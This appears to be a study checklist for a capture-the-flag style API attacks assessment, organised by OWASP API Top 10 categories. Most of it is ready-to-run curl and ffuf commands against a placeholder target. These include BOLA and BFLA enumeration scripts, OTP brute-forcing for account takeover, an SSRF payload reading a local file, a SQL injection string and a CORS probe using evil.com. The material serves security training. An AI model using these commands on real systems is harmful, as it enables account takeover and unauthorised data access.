# API Attacks — Skills Assessment Checklist

Use this before and during every skills assessment. Work top to bottom — do not skip phases.

---

## Phase 0: Recon (Do This First, Every Time)

- [ ] Fingerprint server: `curl -si http://<TARGET>/swagger | grep -i "server:"`
- [ ] Dump all v1 endpoint paths: `curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep '"/api/'`
- [ ] Check for v0 (legacy): `curl -s http://<TARGET>/swagger/v0/swagger.json | python3 -m json.tool | grep '"/api/'`
- [ ] Authenticate (customer or supplier depending on credentials given)
- [ ] Check roles: `curl -s 'http://<TARGET>/api/v1/roles/current-user' -H "Authorization: Bearer $JWT" | jq`
- [ ] Note role names → map to endpoint names

---

## Phase 1: Inventory Management (API9) — Check v0 First

If v0 exists and has endpoints with no lock icon (no auth):

- [ ] `curl -s 'http://<TARGET>/api/v0/customers/deleted' | jq`
- [ ] `curl -s 'http://<TARGET>/api/v0/suppliers/deleted' | jq`
- [ ] `curl -s 'http://<TARGET>/api/v0/supplier-companies/deleted' | jq`
- [ ] Note: v0 uses **uppercase** field names (`ID`, `Name`, `Email`, `PasswordHash`)

---

## Phase 2: BFLA (API5) — If No Roles or Few Roles

- [ ] Write `/tmp/bfla.sh` and run it against all collection GET endpoints
- [ ] Endpoints returning real data = BFLA vulnerable
- [ ] Read ALL fields in BFLA responses — flag often in `street`, `email`, or unexpected fields
- [ ] Filter BFLA data for specific IDs: `jq '.wrapperKey[] | select(.customerID == "<ID>")'`

---

## Phase 3: BOLA (API1) — If Role Has {ID} Endpoint

- [ ] Role ends in `ByID` or `GetXByID` → find the endpoint in swagger
- [ ] Write `/tmp/bola.sh` — loop integers 1–30 against the endpoint
- [ ] Read every response field — flag often in `commentsFromManager` or similar internal fields

---

## Phase 4: Broken Authentication (API2)

- [ ] Test password reset flow: trigger email OTP → immediately ffuf OTP brute-force
- [ ] Use process substitution `<(seq -w 0 9999)` for OTP wordlist — not a file
- [ ] Use `-t 10` threads, `-mr '"SuccessStatus"\s*:\s*true'`
- [ ] After takeover: hit `current-user` endpoints (no role needed)
- [ ] Try known emails first: `MasonJenkins@ymail.com`, `htbpentesterN@hackthebox.com`

---

## Phase 5: Object Property Auth (API3)

### Excessive Data Exposure
- [ ] Call every GET endpoint the user has access to
- [ ] Inspect ALL response fields — look for `email`, `passwordHash`, `isExempted`, internal flags
- [ ] Flag is often in a field that shouldn't be visible to this role

### Mass Assignment
- [ ] Get swagger schema for every POST/PATCH endpoint: `grep -A 30 "<CommandName>"`
- [ ] Look for server-computed fields: `NetSum`, `Price`, `TotalAmount`, `IsExempted`, `Status`
- [ ] Send those fields with `0` or `true` — flag returned on success

---

## Phase 6: Resource Consumption (API4)

- [ ] Find password reset / OTP / SMS endpoints — check if role is required (often none)
- [ ] Spam in a loop with a valid email — flag appears after a threshold of requests
- [ ] Known valid customer email: `MasonJenkins@ymail.com`

---

## Phase 7: SSRF (API7)

Indicators: supplier role includes `UploadPhoto`/`UploadCertificate` + `Update`.

- [ ] Get supplier ID: `curl -s 'http://<TARGET>/api/v1/suppliers/current-user' -H "Authorization: Bearer $JWT" | jq`
- [ ] Create a product with `"PNGPhotoFileURI":"NotProvidedYet"` → save product ID
- [ ] PATCH `PNGPhotoFileURI` to `file:///etc/flag.conf`
- [ ] GET `/api/v1/products/<ID>/photo` → pipe `jq -r '.base64Data' | base64 -d`
- [ ] If certificate endpoint needed: upload real PDF first, then PATCH

---

## Phase 8: Security Misconfiguration (API8)

### SQL Injection
- [ ] Role ends in `ByNameSubstring` or `Count` → endpoint takes string parameter in path
- [ ] Test: `curl -s "http://<TARGET>/api/v1/<group>/a'/count" -H "Authorization: Bearer $JWT" | jq`
- [ ] If error → inject: `curl -s "http://<TARGET>/api/v1/<group>/a'%20OR%201=1%20--/count" -H "Authorization: Bearer $JWT" | jq`

### CORS
- [ ] `curl -si 'http://<TARGET>/api/v1/roles/current-user' -H "Authorization: Bearer $JWT" -H "Origin: http://evil.com" | grep -i "access-control"`
- [ ] Misconfigured = `Access-Control-Allow-Origin: *`

---

## Ready-to-Go Commands

### Authenticate
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
```
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
```

### Roles
```bash
curl -s 'http://<TARGET>/api/v1/roles/current-user' -H "Authorization: Bearer $JWT" | jq
```

### Swagger — all paths
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep '"/api/'
```

### Swagger — schema for a command
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 30 "<CommandName>"
```

### BFLA sweep (write to file)
```bash
cat > /tmp/bfla.sh << 'EOF'
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
ENDPOINTS=("/api/v1/supplier-companies" "/api/v1/supplier-companies/yearly-reports" "/api/v1/suppliers" "/api/v1/suppliers/quarterly-reports" "/api/v1/products" "/api/v1/products/discounts" "/api/v1/customers" "/api/v1/customers/payment-options" "/api/v1/customers/orders" "/api/v1/customers/billing-addresses")
for ep in "${ENDPOINTS[@]}"; do
  echo "=== $ep ==="
  curl -s "http://<TARGET>${ep}" -H "Authorization: Bearer $JWT" | jq -c '.' | head -c 300
  echo
done
EOF
bash /tmp/bfla.sh
```

### BOLA sweep (write to file)
```bash
cat > /tmp/bola.sh << 'EOF'
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
for ((i=1; i<=30; i++)); do
  echo "=== ID $i ==="
  curl -s "http://<TARGET>/api/v1/<endpoint>/$i" -H "Authorization: Bearer $JWT" | jq
done
EOF
bash /tmp/bola.sh
```

### OTP brute-force
```bash
curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/email-otps' -H 'Content-Type: application/json' -d '{"Email":"<TARGET_EMAIL>"}' | jq
```
```bash
ffuf -X POST -u 'http://<TARGET>/api/v1/authentication/customers/passwords/resets' -H 'Content-Type: application/json' -d '{"Email":"<TARGET_EMAIL>","OTP":"FUZZ","NewPassword":"NewP@ssw0rd1"}' -w <(seq -w 0 9999):FUZZ -t 10 -mr '"SuccessStatus"\s*:\s*true'
```

### SSRF
```bash
curl -s -X POST 'http://<TARGET>/api/v1/products/current-user' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"NewProduct":{"Name":"TestProduct","Price":10.0,"PNGPhotoFileURI":"NotProvidedYet"}}' | jq
```
```bash
curl -s -X PATCH 'http://<TARGET>/api/v1/products' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"UpdatedProduct":{"ProductID":"<ID>","SupplierID":"<ID>","Name":"TestProduct","Price":10.0,"PNGPhotoFileURI":"file:///etc/flag.conf"}}' | jq
```
```bash
curl -s 'http://<TARGET>/api/v1/products/<PRODUCT_ID>/photo' -H "Authorization: Bearer $JWT" | jq -r '.base64Data' | base64 -d
```

### SQL injection
```bash
curl -s "http://<TARGET>/api/v1/suppliers/a'%20OR%201=1%20--/count" -H "Authorization: Bearer $JWT" | jq
```

### CORS check
```bash
curl -si 'http://<TARGET>/api/v1/roles/current-user' -H "Authorization: Bearer $JWT" -H "Origin: http://evil.com" | grep -i "access-control"
```

### v0 deleted data
```bash
curl -s 'http://<TARGET>/api/v0/suppliers/deleted' | jq '.[] | select(.Name == "<NAME>")'
curl -s 'http://<TARGET>/api/v0/supplier-companies/deleted' | jq '.[] | select(.ID == "<ID>")'
```

---

## Common Pitfalls

| Pitfall | Fix |
|---------|-----|
| Empty response from curl | JWT expired — re-authenticate |
| JWT set in script subshell, empty in current shell | Re-authenticate in current shell |
| jq filter returns nothing | Check field name casing (v0 uses uppercase `ID`, v1 uses lowercase `id`) |
| PATCH returns "missing required properties" | Wrap fields in object key (e.g., `{"UpdatedProduct":{...}}`) |
| PATCH field treated as null | Use `1` instead of `0` for numeric boolean fields |
| base64 invalid input | Check raw response first with `| jq` — field may contain an error string |
| ffuf finds nothing | Check filter/match flag — use `-mr '"SuccessStatus"\s*:\s*true'` not `-fr false` |
| SSRF returns "error reading file" | Try products endpoint — certificate endpoint has different file permissions |
